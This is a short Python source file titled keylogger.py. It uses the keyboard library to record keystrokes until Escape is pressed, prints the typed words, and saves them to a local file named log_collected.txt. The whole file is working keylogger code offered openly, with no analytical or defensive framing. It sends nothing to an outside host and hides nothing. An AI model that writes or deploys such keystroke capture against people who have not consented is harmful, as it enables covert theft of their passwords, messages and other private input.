# keylogger.py
import keyboard

# Our keylogger main function that breaks with an escape
def report_keyboard():
    events = keyboard.record(until='Esc') 
    words = list(keyboard.get_typed_strings(events))  # Convert generator to list

    print("The words used are: ")
    print(" ".join(words))  # Join the words with a space for printing

    # Save it in a file, with statement automatically handle the file closing
    with open("log_collected.txt", 'w') as f:
        for word in words:
            f.write(word + " ")  